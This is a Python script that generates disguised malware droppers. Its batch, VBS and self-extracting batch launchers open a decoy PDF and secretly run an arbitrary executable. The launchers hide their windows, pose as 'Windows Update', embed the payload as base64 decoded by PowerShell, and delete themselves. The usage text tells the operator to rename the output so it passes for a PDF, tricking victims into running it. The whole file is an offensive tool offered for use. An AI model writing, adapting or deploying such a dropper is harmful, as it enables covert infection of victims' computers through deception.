#!/usr/bin/env python3
"""
Simple PDF Launcher - No PyInstaller Required
Creates a batch file that launches PDF and EXE
"""

import os
import sys
import shutil
import base64

def create_launcher_batch(pdf_path, exe_path, output_name="launcher.bat"):
    """Create a batch file launcher"""
    
    # Copy files to temp locations
    pdf_name = os.path.basename(pdf_path)
    exe_name = os.path.basename(exe_path)
    
    batch_content = f'''@echo off
title Windows Update Service
mode con: cols=0 lines=0

REM Copy PDF to temp
copy "{pdf_path}" "%temp%\\{pdf_name}" > nul

REM Copy EXE to temp  
copy "{exe_path}" "%temp%\\{exe_name}" > nul

REM Open PDF
start "" "%temp%\\{pdf_name}"

REM Wait a bit
timeout /t 2 /nobreak > nul

REM Run EXE hidden
start /B "" "%temp%\\{exe_name}"

REM Self delete
del "%~f0" > nul
'''
    
    with open(output_name, "w") as f:
        f.write(batch_content)
    
    print(f"[+] Created launcher: {output_name}")
    return output_name

def create_vbs_launcher(pdf_path, exe_path, output_name="launcher.vbs"):
    """Create VBS launcher (more stealthy)"""
    
    vbs_content = f'''Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Copy files
pdf_temp = fso.GetSpecialFolder(2) & "\\document.pdf"
exe_temp = fso.GetSpecialFolder(2) & "\\update.exe"

fso.CopyFile "{pdf_path}", pdf_temp, True
fso.CopyFile "{exe_path}", exe_temp, True

' Open PDF
WshShell.Run pdf_temp, 1, False

' Wait
WScript.Sleep 2000

' Run EXE hidden
WshShell.Run exe_temp, 0, False

' Delete this script
fso.DeleteFile WScript.ScriptFullName
'''
    
    with open(output_name, "w") as f:
        f.write(vbs_content)
    
    print(f"[+] Created VBS launcher: {output_name}")
    return output_name

def create_self_extracting_batch(pdf_path, exe_path, output_name="setup.bat"):
    """Create self-extracting batch file with embedded files"""
    
    # Read files and encode
    with open(pdf_path, "rb") as f:
        pdf_b64 = base64.b64encode(f.read()).decode()
    
    with open(exe_path, "rb") as f:
        exe_b64 = base64.b64encode(f.read()).decode()
    
    batch_content = f'''@echo off
title Windows Update
mode con: cols=0 lines=0

REM Create PowerShell script to decode and run
powershell -Command "$pdf=[System.Convert]::FromBase64String('{pdf_b64}'); [System.IO.File]::WriteAllBytes('$env:temp\\document.pdf', $pdf)"
powershell -Command "$exe=[System.Convert]::FromBase64String('{exe_b64}'); [System.IO.File]::WriteAllBytes('$env:temp\\update.exe', $exe)"

REM Open PDF
start "" "%temp%\\document.pdf"

REM Wait
timeout /t 2 /nobreak > nul

REM Run EXE
start /B "" "%temp%\\update.exe"

REM Cleanup
del "%~f0" > nul
'''
    
    with open(output_name, "w") as f:
        f.write(batch_content)
    
    print(f"[+] Created self-extracting launcher: {output_name}")
    return output_name

def main():
    print("=" * 60)
    print("SIMPLE PDF LAUNCHER (No PyInstaller)")
    print("=" * 60)
    
    pdf_file = input("PDF file path: ").strip().strip('"')
    exe_file = input("Executable file path: ").strip().strip('"')
    
    if not os.path.exists(pdf_file):
        print(f"[!] PDF not found: {pdf_file}")
        return
    
    if not os.path.exists(exe_file):
        print(f"[!] EXE not found: {exe_file}")
        return
    
    print("\n[?] Select method:")
    print("  1. Batch file (.bat) - Simple")
    print("  2. VBS script (.vbs) - More stealthy")
    print("  3. Self-extracting batch - No external files")
    
    choice = input("Choice (1/2/3): ").strip()
    
    if choice == "1":
        create_launcher_batch(pdf_file, exe_file, "report.pdf.bat")
        print("\n[!] Rename 'report.pdf.bat' to 'report.pdf' if extensions are hidden")
    elif choice == "2":
        create_vbs_launcher(pdf_file, exe_file, "report.pdf.vbs")
        print("\n[!] Rename 'report.pdf.vbs' to 'report.pdf' if extensions are hidden")
    else:
        create_self_extracting_batch(pdf_file, exe_file, "report.pdf.bat")
    
    print("\n[!] How to use:")
    print("    - Rename the output file to look like a PDF")
    print("    - When clicked, it opens the PDF and runs your EXE")
    print("    - Works on Windows without Python installed")

if __name__ == "__main__":
    main()